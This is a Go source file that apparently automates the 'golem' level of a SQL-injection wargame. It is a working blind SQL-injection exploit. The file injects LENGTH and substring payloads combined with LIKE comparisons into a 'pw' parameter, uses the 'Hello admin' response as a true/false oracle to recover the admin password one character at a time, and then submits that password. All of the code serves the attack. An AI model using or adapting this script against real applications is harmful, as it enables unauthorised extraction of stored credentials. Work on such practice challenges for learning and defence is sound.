package problem

import (
	"fmt"
	"strconv"
	"strings"
)

func find_len3(file, session string) int{
	for length := 0 ; length < 50; length += 1 {
		s_pw := "' || LENGTH(pw) LIKE '" + strconv.Itoa(length)
		param := map[string]string{
			"pw" : s_pw,
		}
		
		contents := connect(file, param, session)
		if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
			return length
		}
	}
	return 0
}

func find_pw3(file string, length int, session string)string{
	result := ""
	NEXT_STR:
	for i := 1 ; i <= length; i += 1 {
		url_str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		for j :=0 ; j< len(url_str); j += 1 {
			s_pw := "' || substring(pw," + strconv.Itoa(i) + ",1) LIKE '" + string(url_str[j])
			param := map[string]string{
				"pw" : s_pw,
			}
			
			contents := connect(file, param, session)
			if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
				result += string(url_str[j])
				continue NEXT_STR
			}
		}
	}
	return result
}

func Golem(session string){
	file := "golem_9433f16f7a3899d7cf3fe48330f22018.php"
	
	length := find_len3(file, session)
	//fmt.Println("Key length is "+ strconv.Itoa(length) + ".")
	
	pw_str := find_pw3(file,length, session)
	//fmt.Println("pw is "+ pw_str + ".")

	param := map[string]string{
		"pw" : pw_str,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"GOLEM Clear!"){
		fmt.Println("GOLEM Clear!")
	}
}